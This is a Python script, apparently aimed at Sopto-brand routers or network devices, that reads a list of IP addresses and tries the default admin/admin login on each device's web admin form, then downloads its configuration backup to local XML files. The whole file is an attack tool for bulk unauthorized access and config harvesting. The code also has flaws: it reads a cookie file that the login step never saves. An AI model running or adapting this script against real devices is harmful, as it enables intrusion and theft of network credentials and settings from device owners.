import subprocess
import logging
import os
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def send_login_request(ip):
    login_command = [
        'curl',
        f'http://{ip}/boaform/admin/formLogin',
        '-H', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        '-H', 'Accept-Language: en-US,en',
        '-H', 'Cache-Control: max-age=0',
        '-H', 'Connection: keep-alive',
        '-H', 'Content-Type: application/x-www-form-urlencoded',
        '-H', 'Cookie: userLanguage=en',
        '-H', f'Origin: http://{ip}',
        '-H', f'Referer: http://{ip}/admin/login.asp',
        '-H', 'Sec-GPC: 1',
        '-H', 'Upgrade-Insecure-Requests: 1',
        '-H', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
        '--data-raw', 'challenge=&username=admin&password=admin&save=Login&submit-url=%2Fadmin%2Flogin.asp&postSecurityFlag=12726',
        '--insecure',
    ]
    try:
        result = subprocess.run(login_command, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Login failed: {result.stderr}")
        return True
    except Exception as e:
        logging.error(f"Error logging in to {ip}: {str(e)}")
        return False

def download_config(ip):
    download_command = [
        'curl',
        f'http://{ip}/boaform/formSaveConfig',
        '-H', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        '-H', 'Accept-Language: en-US,en',
        '-H', 'Cache-Control: max-age=0',
        '-H', 'Connection: keep-alive',
        '-H', 'Content-Type: application/x-www-form-urlencoded',
        '-b', f'{ip}_cookies.txt',  # Use saved cookies
        '-H', f'Origin: http://{ip}',
        '-H', f'Referer: http://{ip}/saveconf.asp',
        '-H', 'Sec-GPC: 1',
        '-H', 'Upgrade-Insecure-Requests: 1',
        '-H', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
        '--data-raw', 'save_cs=Backup...&submit-url=%2Fsaveconf.asp&postSecurityFlag=63991',
        '--insecure',
        '-o',
        os.path.join("sopto_xml", f"{ip}.xml"),
    ]
    try:
        result = subprocess.run(download_command, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Download failed: {result.stderr}")
        return True
    except Exception as e:
        logging.error(f"Error downloading config from {ip}: {str(e)}")
        return False

def main():
    failed_operations = []
    
    try:
        with open("sopto.txt", "r") as file:
            ip_list = [ip.strip() for ip in file.readlines()]
    except FileNotFoundError:
        logging.error("sopto.txt not found")
        return
        
    with ThreadPoolExecutor(max_workers=5) as executor:
        for ip in ip_list:
            try:
                if send_login_request(ip):
                    if download_config(ip):
                        logging.info(f"Successfully processed {ip}")
                    else:
                        failed_operations.append(f"{ip} (config download failed)")
                else:
                    failed_operations.append(f"{ip} (login failed)")
            except Exception as e:
                logging.error(f"Error processing {ip}: {str(e)}")
                failed_operations.append(ip)
    
    if failed_operations:
        logging.info("Failed operations:")
        for ip in failed_operations:
            logging.info(f"- {ip}")
    else:
        logging.info("All operations successful")

if __name__ == "__main__":
    main()